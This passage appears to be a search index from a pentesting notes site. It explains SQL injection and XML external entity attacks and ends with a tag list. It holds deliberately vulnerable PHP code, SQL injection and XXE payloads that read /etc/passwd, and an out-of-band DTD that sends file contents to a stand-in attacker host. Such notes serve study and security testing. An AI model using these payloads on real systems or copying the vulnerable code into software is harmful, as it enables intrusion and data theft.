or a concept, and the columns of the table represent the attributes of that entity or concept. SQL databases are relational databases that store data in tables with rows and columns, and use SQL (Structured Query Language) as their standard language for managing data. They enforce strict data integrity rules and support transactions to ensure data consistency. SQL databases are widely used in applications that require complex data queries and the ability to handle large amounts of structured data. Some examples of SQL databases include MySQL, Oracle, Microsoft SQL Server, and PostgreSQL.</li> <li>NoSQL Databases  - A type of database that does not use the traditional tabular relations used in relational databases. Instead, NoSQL databases use a variety of data models to store and access data.</li> <li>Object-oriented Databases - A database that stores data as objects rather than in tables, allowing for more complex data structures and relationships.</li> </ul> <p></p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#1-rdbms-relational-database-management-system","title":"1. RDBMS - Relational Database Management System","text":"<p>RDBMS stands for Relational Database Management System. It is a software system that enables the creation, management, and administration of relational databases. RDBMSs are designed to store, organize, and retrieve large amounts of structured data efficiently. RDBMSs provide a set of features and functionalities that allow users to create database schemas, define relationships between tables, insert, update, and retrieve data, and perform complex queries using SQL. They also handle aspects like data security, transaction  Management, and concurrency control to ensure data integrity and consistency.</p> <p>The following are examples of popular DBMS (Database Management Systems):</p> <ul> <li>MySQL - A free, open-source relational database management system that is widely used for web applications.</li> <li>PostgreSQL - Another popular open-source relational database management system that is known for its advanced features and reliability. </li> <li>Oracle Database - A commercial relational database management system developed by Oracle Corporation that is widely used in enterprise applications.</li> <li>Microsoft SQL Server - A commercial relational database  Management system developed.</li> </ul> <p>How relational databases work:  </p> <ul> <li> <p>Tables: The basic building blocks of a relational database are tables, also known as relations. A table consists of rows (also called records or tuples) and columns (also known as attributes). Each row represents a unique record or instance of an entity, and each column represents a specific attribute or characteristic of that entity.</p> </li> <li> <p>Keys: Keys are used to uniquely identify records within a table and establish relationships between tables. The primary key is a column or set of columns that uniquely identifies each row in a table. It ensures the integrity and uniqueness of the data. Foreign keys are columns in one table that reference the primary key of another table, establishing relationships between the tables.</p> </li> <li> <p>Relationships: Relationships define how tables are connected or associated with each other. Common types of relationships include one-to-one, one-to-many, and many-to-many. These relationships are established using primary and foreign keys, allowing data to be linked and retrieved across multiple tables.</p> </li> <li> <p>Structured Query Language (SQL): Relational databases are typically accessed and manipulated using the  Structured Query Language (SQL). SQL provides a standardized language for querying, inserting, updating, and deleting data from relational databases. It allows users to perform operations such as retrieving specific records, filtering data based on conditions, joining tables to combine data, and aggregating data using functions.</p> </li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#2-nosql","title":"2. NoSQL","text":"<p>[NoSQL] (Not Only SQL) databases are a type of database management system that differ from traditional relational databases (RDBMS) in terms of data model, scalability, and flexibility. NoSQL databases are designed to handle large volumes of unstructured, semi-structured, and rapidly changing data. NoSQL databases are commonly used in modern web applications, big data analytics, real-time streaming, content management systems, and other scenarios where the flexibility, scalability, and performance advantages they offer are valuable.</p> <p>There are several popular NoSQL databases available, each with its own strengths and use cases. Here are some examples of well-known NoSQL databases:</p> <ul> <li>MongoDB: MongoDB is a document database that stores data in flexible, JSON-like documents. It provides scalability, high performance, and rich query capabilities. MongoDB is widely used in web applications, content management systems, and real-time analytics. It uses MQL (MongoDB Query Language).</li> <li>Redis: Redis is an in-memory data store that supports various data structures, including strings, hashes, lists, sets, and sorted sets. It is known for its exceptional performance and low latency. Redis is often used for caching, real-time analytics, session management, and pub/sub messaging.</li> <li>Amazon DynamoDB.</li> <li>CouchBase Server.</li> <li>Apache Cassandra: Distributed columnar database designed to handle large amounts of data across multiple commodity servers. It offers hight availability, fault tolerance, and linear scalability,</li> <li>Apache HBase.</li> <li>Riak.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#how-web-applications-utilize-sql-queries","title":"How web applications utilize SQL queries","text":"<p>The following code contains a PHP example of a connection to a MySQL database and the execution of a SQL query.</p> <pre><code>$dbhostname='1.2.3.4';\n$dbuser='username';\n$dbpassword='password';\n$dbname='database';\n\n$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);\n$query = \"SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;\";\n\n$results = mysqli_query($connection, $query);\ndisplay_results($results);\n</code></pre> <p>Most of the times queries are not static; they are indeed dynamically built by using user' inputs. Here you can find a vulnerable dynamic query example:</p> <pre><code>$id = $_GET['id'];\n\n$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);\n$query = \"SELECT Name, Description FROM Products WHERE ID='$id';\";\n\n$results = mysqli_query($connection, $query);\ndisplay_results($results);\n</code></pre> <p>If an attacker crafts an $id value which can actually change the query, like:</p> <pre><code>' OR 'a'='a\n</code></pre> <p>Then the query becomes:</p> <pre><code>SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';\n</code></pre> <p>This tells the database to select the items by checking two conditions:</p> <ul> <li>The id must be empty (id='') OR an always true condition ('a'='a\u2019)</li> <li>While the first condition is not met, the SQL engine will consider the second condition of the OR. This second condition is crafted as an always true condition. </li> </ul> <p>In other words, this tells the database to select all the items in the Products table.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#common-injectable-fields","title":"Common injectable fields","text":"<p>SQL injection vulnerabilities can exist in various input fields within an application.</p> <ul> <li>Login forms: The username and password fields in a login form are common targets for SQL injection attacks.</li> <li>Search boxes: Input fields used for searching within an application are potential targets for SQL injection. If the search query is directly incorporated into a SQL statement without proper validation, an attacker can inject malicious SQL code to manipulate the query and potentially access unauthorized data.</li> <li>URL parameters: Web applications often use URL parameters to pass data between pages. If the application uses these parameters directly in constructing SQL queries without proper validation and sanitization, it can be susceptible to SQL injection attacks.</li> <li>Form fields: Any input fields in forms, such as registration forms, contact forms, or comment fields, can be vulnerable to SQL injection if the input is not properly validated and sanitized before being used in SQL queries. </li> <li>Hidden fields: Hidden fields in HTML forms can also be susceptible to SQL injection attacks if the data from these fields is directly incorporated into SQL queries without proper validation.</li> <li>Cookies: In some cases, cookies containing user data or session information may be used in SQL queries. If the application does not validate or sanitize the cookie data properly, it can lead to SQL injection vulnerabilities.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> <li> <p>Detailed Cheat sheet with manual union and blind attacks can be found in the SQLi Cheat sheet for manual attack.</p> </li> <li> <p>https://portswigger.net/web-security/sql-injection/cheat-sheet.</p> </li> <li>https://github.com/payloadbox/sql-injection-payload-list.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/xml-external-entity-xee/","title":"XXE - XEE XML External Entity attacks","text":"Sources <ul> <li>HackTricks.</li> <li>Portsqigger.</li> </ul>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#basic-concepts","title":"Basic concepts","text":"","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#what-it-xml","title":"What it XML?","text":"<p>XML stands for \"extensible markup language\". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. </p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#what-are-xml-entities","title":"What are XML entities?","text":"<p>XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters &lt; and &gt;. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.</p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#what-are-xml-elements","title":"What are XML elements?","text":"<p>Element type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:</p> <pre><code>&lt;!ELEMENT root ANY&gt; Means that any object could be inside the parent &lt;root&gt;&lt;/root&gt;\n\n&lt;!ELEMENT root EMPTY&gt; Means that it should be empty &lt;stockCheck&gt;&lt;/stockCheck&gt;\n\n&lt;!ELEMENT root (name,password)&gt; Declares that &lt;root&gt; can have the children &lt;name&gt; and &lt;password&gt;\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#what-is-document-type-definition","title":"What is document type definition?","text":"<p>The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an \"internal DTD\") or can be loaded from elsewhere (known as an \"external DTD\") or can be hybrid of the two.</p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#how-xml-custom-entities-work","title":"How XML custom entities work?","text":"<p>XML allows custom entities to be defined within the DTD. For example:</p> <pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity \"my entity value\" &gt; ]&gt;\n</code></pre> <p>This definition means that any usage of the entity reference &amp;myentity; within the XML document will be replaced with the defined value: \"my entity value\".</p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#what-are-xml-external-entities","title":"What are XML external entities?","text":"<p>XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared. The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:</p> <pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM \"http://normal-website.com\" &gt; ]&gt;\n</code></pre> <p>The URL can use the file:// protocol, and so external entities can be loaded from file. For example:</p> <pre><code>&lt;!DOCTYPE nameThatYouWant [ &lt;!ENTITY nameofEntity SYSTEM \"file:///path/to/file\" &gt; ]&gt;\n&lt;root&gt;\n    &lt;name&gt;&amp;nameofEntity;&lt;/name&gt;\n    &lt;password&gt;1&lt;/password&gt;\n&lt;/root&gt;\n\n# nameThatyouWant: string with the name that you want\n# nameofEntity: we will call the entity using this name. It\n# &lt;!ENTITY: There might be more than one entity defined\n# SYSTEM: allow us to call the entity\n# file:// -&gt; To call an internal value. But instead of file we can call:\n    # http://\n    # ftp://\n    # ssh://\n    # php://\n# &amp;nameofEntity;  -&gt; This is how you request the object\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#classic-xml-external-entity","title":"Classic XML External Entity","text":"<pre><code># Classic XXE\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt; ]&gt;\n&lt;name&gt;&amp;nameofEntity;&lt;/name&gt;\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#base-encoded-xml-external-entity","title":"Base-encoded XML External Entity","text":"<pre><code># Base encoded XXE\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\" &gt; ]&gt;\n&lt;name&gt;&amp;nameofEntity;&lt;/name&gt;\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#blind-xml-external-entity-out-of-band","title":"Blind XML External Entity - Out of Band","text":"<pre><code># Blind XXE 1\n&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"file:///etc/passwd\"&gt; %xxe; ]&gt;\n</code></pre> <pre><code># Blind XXE 2\n&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"http://malicious.com/exploit\"&gt; %xxe; ]&gt;\n\n    # http://malicious.com/exploit will contain another entity such as \n&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"file:///etc/passwd\"&gt; %xxe; ]&gt;\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#but-why-external-entities-are-accepted","title":"But why external entities are accepted","text":"<p>This is a snipped of a PHP code that accept extenal DTDs</p> <pre><code>&lt;?php\n\nlibxml_disable_entity_loader (false);\n// libxml_disable_entity_loader (true);\n\n$xmlfile = file_get_contents('php://input');\n$dom = new DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n$info = simplexml_import_dom($dom);\n$name = $info-&gt;name;\n$password = $info-&gt;password;\n\necho \"Sorrym this $name is not available\";\n?&gt;\n</code></pre> <p>Allowing external DTDs is done in line:</p> <pre><code>libxml_disable_entity_loader (false);\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#main-attacks","title":"Main attacks","text":"","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#new-entity-test","title":"New Entity test","text":"<p>In this attack I'm going to test if a simple new ENTITY declaration is working:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [&lt;!ENTITY toreplace \"3\"&gt; ]&gt;\n&lt;stockCheck&gt;\n    &lt;productId&gt;&amp;toreplace;&lt;/productId&gt;\n    &lt;storeId&gt;1&lt;/storeId&gt;\n&lt;/stockCheck&gt;\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#1-retrieve-files","title":"1. Retrieve files","text":"<p>Modify the submitted XML in two ways:</p> <ul> <li>Introduce (or edit) a\u00a0<code>DOCTYPE</code>\u00a0element that defines an external entity containing the path to the file.</li> <li>Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.</li> </ul> <p>In a windows system, we may use c:/windows/system32/drivers/etc/hosts:</p> <pre><code>POST /process.php HTTP/1.1\nHost: 10.129.95.192\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: text/xml\nContent-Length: 192\nOrigin: http://10.129.95.192\nConnection: close\nReferer: http://10.129.95.192/services.php\nCookie: PHPSESSID=1gjqt353d2lm5222nl3ufqru10\n\n&lt;?xml version = \"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'&gt;]&gt;\n&lt;order&gt;\n    &lt;quantity&gt;2&lt;/quantity&gt;\n    &lt;item&gt;&amp;test;&lt;/item&gt;\n    &lt;address&gt;1&lt;/address&gt;\n&lt;/order&gt;\n</code></pre> <p>In a Linux server go for </p> <pre><code># example 1\n&lt;?xml version = \"1.0\"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY example1 SYSTEM \"/etc/passwd\"&gt; ]&gt;\n&lt;order&gt;\n    &lt;quantity&gt;2&lt;/quantity&gt;\n    &lt;item&gt;&amp;example1;&lt;/item&gt;\n    &lt;address&gt;1&lt;/address&gt;\n&lt;/order&gt;\n\n\n# example 2\n&lt;?xml version = \"1.0\"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY example2 SYSTEM \"file:///etc/passwd\" &gt; ]&gt;\n&lt;order&gt;\n    &lt;quantity&gt;2&lt;/quantity&gt;\n    &lt;item&gt;&amp;example2;&lt;/item&gt;\n    &lt;address&gt;1&lt;/address&gt;\n&lt;/order&gt;\n</code></pre> <p>Encoding techniques</p> <pre><code># Base encoded XXE\n&lt;?xml version = \"1.0\"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\" &gt; ]&gt;\n&lt;name&gt;&amp;nameofEntity;&lt;/name&gt;\n</code></pre> <p>This filter return the file base64-encoded to avoid data loss and truncate.</p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#2-chaining-xxe-to-ssrf-attacks","title":"2. Chaining XXE to SSRF attacks","text":"<p>To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. </p> <pre><code>&lt;?xml version = \"1.0\"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"http://internal.vulnerable-website.com/\"&gt; ]&gt;\n</code></pre> <p>You would then make use of the defined entity in a data value within the XML.</p> <p>See this lab with an example of exploitation</p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#3-blind-xxe-vulnerabilities","title":"3. Blind XXE vulnerabilities","text":"<p>Sometimes the application does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible.</p> <p>Blind XXE requires the use of out-of-band techniques, and call the parameter (for example xxe) just after the ENTITY definition. Therefore, XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.</p> <pre><code>&lt;?xml version = \"1.0\"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"http://internal.vulnerable-website.com/\"&gt; %xxe;]&gt;\n</code></pre> <p>You don't need to make use of the defined entity in a data value within the XML as the <code>%xxe;</code> is already calling the entity.</p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#4-blind-xxe-with-data-exfiltration-out-of-band-blind-xxe-with-oob-data-exfiltration","title":"4. Blind XXE with data exfiltration out-of-band (Blind XXE with OOB data exfiltration)","text":"<p>1. Create a malicious.dtd file:</p> <p><pre><code>&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt; \n&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;\"&gt; %eval; %exfiltrate;\n</code></pre> Basically, malicious.dtd retrieves /etc/passwd from the instance in which is executed. </p> <p>2. Serve our malicious.dtd from http://atacker.com/malicious.dtd.</p> <p>3. Submit a payload to the victim via XXE (blind) with a xml parameter entity.</p> <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \"http://attacker.com/malicious.dtd\"&gt; %xxe;]&gt;\n</code></pre> <p>This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline.</p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#5-blind-xxe-to-retrieve-data-via-error-messages","title":"5. Blind XXE to retrieve data via error messages","text":"<p>An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. </p> <ul> <li>Trigger an XML parsing error message containing the contents of the\u00a0<code>/etc/passwd</code>\u00a0file using a malicious external DTD as follows:</li> </ul> <pre><code>&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;\"&gt; %eval; %error;\n</code></pre> <p>Invoking the malicious external DTD may result in an error message like the following:</p> <pre><code>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#6-blind-xxe-by-repurposing-a-local-dtd","title":"6. Blind XXE by repurposing a local DTD","text":"<p>If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.</p> <p>Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data.</p> <p>For example, suppose there is a DTD file on the server filesystem at the location\u00a0<code>/usr/local/app/schema.dtd</code>, and this DTD file defines an entity called\u00a0<code>custom_entity</code>. An attacker can trigger an XML parsing error message containing the contents of the\u00a0<code>/etc/passwd</code>\u00a0file by submitting a hybrid DTD like the following:</p> <pre><code>&lt;!DOCTYPE foo [ \n&lt;!ENTITY % local_dtd SYSTEM \"file:///usr/local/app/schema.dtd\"&gt; \n&lt;!ENTITY % custom_entity ' \n&lt;!ENTITY &amp;#x25; file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;\"&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; \n%local_dtd; \n]&gt;\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#7-xinclude-attack","title":"7. XInclude attack","text":"<p>In the following scenario, we cannot implement a classic/blind/oob XXE attack because we don't control the entire XML document and so we cannot define the <code>DOCTYPE</code> element. </p> <p></p> <p>We can bypass this client side verification with XInclude. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. We can place an <code>XInclude</code> attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document. </p> <p>For instance:</p> <pre><code>&lt;d0p xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/d0p&gt;\n</code></pre> <p></p>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#8-xxe-via-file-upload","title":"8. XXE via file upload","text":"<p>In a file upload feature,  if the application expects to receive a format like <code>.png</code> or <code>.jpeg</code>, then the image processing lib is likely to accept <code>.svg</code> too.</p> <p>Our XXE payload could be:</p> <pre><code>&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" &gt; ]&gt;&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"&gt;&lt;text font-size=\"16\" x=\"0\" y=\"16\"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;\n</code></pre>","tags":["xxe"]},{"location":"webexploitation/xml-external-entity-xee/#interesting-files","title":"Interesting files","text":"<p>Interesting Windows files Interesting Linux files</p>","tags":["xxe"]},{"location":"tags/","title":"tags","text":"<p>Following is a list of relevant tags:</p>","tags":["tags"]},{"location":"tags/#161","title":"161","text":"<ul> <li>Final recon - a recon tool with modules</li> </ul>","tags":["tags"]},{"location":"tags/#22","title":"22","text":"<ul> <li>Port 22 - Secure Shell (SSH)</li> </ul>","tags":["tags"]},{"location":"tags/#3389","title":"3389","text":"<ul> <li>Port 3389 - Remote Desktop Protocol (RDP)</li> </ul>","tags":["tags"]},{"location":"tags/#389","title":"389","text":"<ul> <li>Port 389 - 636 LDAP</li> </ul>","tags":["tags"]},{"location":"tags/#5355","title":"5355","text":"<ul> <li>Port 5355 - LLMNR/NBT-NS Poisoning</li> </ul>","tags":["tags"]},{"location":"tags/#5985","title":"5985","text":"<ul> <li>Port 5985, 5986 - Windows Remote Management (WinRM)</li> </ul>","tags":["tags"]},{"location":"tags/#5986","title":"5986","text":"<ul> <li>Port 5985, 5986 - Windows Remote Management (WinRM)</li> </ul>","tags":["tags"]},{"location":"tags/#873","title":"873","text":"<ul> <li>Port 873 - rsync</li> </ul>","tags":["tags"]},{"location":"tags/#azure","title":"Azure","text":"<ul> <li>Pentesting Amazon Web Services (AWS)</li> <li>Pentesting Azure</li> </ul>","tags":["tags"]},{"location":"tags/#cms","title":"CMS","text":"<ul> <li>Pentesting magnolia</li> <li>Pentesting MyBB</li> <li>pentesting wordpress</li> </ul>","tags":["tags"]},{"location":"tags/#cpts","title":"CPTS","text":"<ul> <li>CPTS Cheat sheet</li> <li>CPTS index</li> <li>CPTS labs</li> <li>01. Information Gathering   /  Footprinting</li> <li>Pentesting Notes</li> </ul>","tags":["tags"]},{"location":"tags/#cve-2015-6967","title":"CVE-2015-6967","text":"<ul> <li>Nibbles - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#dns-poisoning","title":"DNS poisoning","text":"<ul> <li>DNS poisoning</li> </ul>","tags":["tags"]},{"location":"tags/#dynamics","title":"Dynamics","text":"<ul> <li>Pentesting oDAta</li> </ul>","tags":["tags"]},{"location":"tags/#http","title":"HTTP","text":"<ul> <li>CSRF attack - Cross Site Request Forgery</li> </ul>","tags":["tags"]},{"location":"tags/#microsoft-365","title":"Microsoft 365","text":"<ul> <li>M365 CLI</li> </ul>","tags":["tags"]},{"location":"tags/#mybb","title":"MyBB","text":"<ul> <li>Pentesting MyBB</li> </ul>","tags":["tags"]},{"location":"tags/#nfc","title":"NFC","text":"<ul> <li>Mifare Classic</li> <li>Mifare Desfire</li> <li>NFC - Setting up proxmark3 RDV4.01</li> <li>Proxmark3 RDV4.01</li> </ul>","tags":["tags"]},{"location":"tags/#nfs","title":"NFS","text":"<ul> <li>Port 111, 32731 -  rpc</li> <li>Port 2049 -  NFS Network File System</li> <li>Port 43 - whois</li> </ul>","tags":["tags"]},{"location":"tags/#ntlm","title":"NTLM","text":"<ul> <li>HTTP Authentication Schemes</li> </ul>","tags":["tags"]},{"location":"tags/#ntlm-credential-stealing","title":"NTLM credential stealing","text":"<ul> <li>Responder - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#network-file-system","title":"Network File System","text":"<ul> <li>Port 111, 32731 -  rpc</li> <li>Port 2049 -  NFS Network File System</li> <li>Port 43 - whois</li> </ul>","tags":["tags"]},{"location":"tags/#nosql","title":"NoSQL","text":"<ul> <li>Mongo</li> </ul>","tags":["tags"]},{"location":"tags/#oscp","title":"OSCP","text":"<ul> <li>Password attacks</li> </ul>","tags":["tags"]},{"location":"tags/#openflow","title":"Openflow","text":"<ul> <li>6653 Openflow</li> </ul>","tags":["tags"]},{"location":"tags/#openstack","title":"Openstack","text":"<ul> <li>Openstack Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#rfid","title":"RFID","text":"<ul> <li>Mifare Classic</li> <li>Mifare Desfire</li> <li>RFID</li> </ul>","tags":["tags"]},{"location":"tags/#rfid-pentesting","title":"RFID pentesting","text":"<ul> <li>NFC - Setting up proxmark3 RDV4.01</li> </ul>","tags":["tags"]},{"location":"tags/#smtp","title":"SMTP","text":"<ul> <li>Ports 25, 565, 587 - Simple Mail Tranfer Protocol (SMTP)</li> <li>MailSniper</li> <li>o365spray</li> <li>postfix - A SMTP server</li> <li>swaks</li> </ul>","tags":["tags"]},{"location":"tags/#smtp-server","title":"SMTP server","text":"<ul> <li>postfix - A SMTP server</li> </ul>","tags":["tags"]},{"location":"tags/#snmp","title":"SNMP","text":"<ul> <li>161-162 SNMP Simple Network Management Protocol</li> </ul>","tags":["tags"]},{"location":"tags/#sql","title":"SQL","text":"<ul> <li>MariaDB</li> <li>MySQL</li> <li>sqlite</li> <li>Virtual environments</li> </ul>","tags":["tags"]},{"location":"tags/#simple-mail-transfer-protocol","title":"Simple Mail Transfer Protocol","text":"<ul> <li>Ports 25, 565, 587 - Simple Mail Tranfer Protocol (SMTP)</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-apit-01","title":"WSTG-APIT-01","text":"<ul> <li>Testing GraphQL - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-01","title":"WSTG-ATHN-01","text":"<ul> <li>Testing for Credentials Transported over an Encrypted Channel - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-02","title":"WSTG-ATHN-02","text":"<ul> <li>Testing for Default Credentials - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-03","title":"WSTG-ATHN-03","text":"<ul> <li>Testing for Weak Lock Out Mechanism - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-04","title":"WSTG-ATHN-04","text":"<ul> <li>Testing for Bypassing Authentication Schema - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-05","title":"WSTG-ATHN-05","text":"<ul> <li>Testing for Vulnerable Remember Password - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-06","title":"WSTG-ATHN-06","text":"<ul> <li>Testing for Browser Cache Weaknesses - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-07","title":"WSTG-ATHN-07","text":"<ul> <li>Testing for Weak Password Policy - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-08","title":"WSTG-ATHN-08","text":"<ul> <li>Testing for Weak Security Question Answer - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-09","title":"WSTG-ATHN-09","text":"<ul> <li>Testing for Weak Password Change or Reset Functionalities - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-10","title":"WSTG-ATHN-10","text":"<ul> <li>Testing for Weaker Authentication in Alternative Channel - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athn-11","title":"WSTG-ATHN-11","text":"<ul> <li>Testing Multi-Factor Authentication (MFA) - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athz-01","title":"WSTG-ATHZ-01","text":"<ul> <li>Testing Directory Traversal File Include - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athz-02","title":"WSTG-ATHZ-02","text":"<ul> <li>Testing for Bypassing Authorization Schema - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athz-03","title":"WSTG-ATHZ-03","text":"<ul> <li>Testing for Privilege Escalation - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athz-04","title":"WSTG-ATHZ-04","text":"<ul> <li>Testing for Insecure Direct Object References - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-athz-05","title":"WSTG-ATHZ-05","text":"<ul> <li>Testing for OAuth Weaknesses - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-01","title":"WSTG-BUSL-01","text":"<ul> <li>Test Business Logic Data Validation - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-02","title":"WSTG-BUSL-02","text":"<ul> <li>Test Ability to Forge Requests - OWASP Web Security Testing Guide</li> 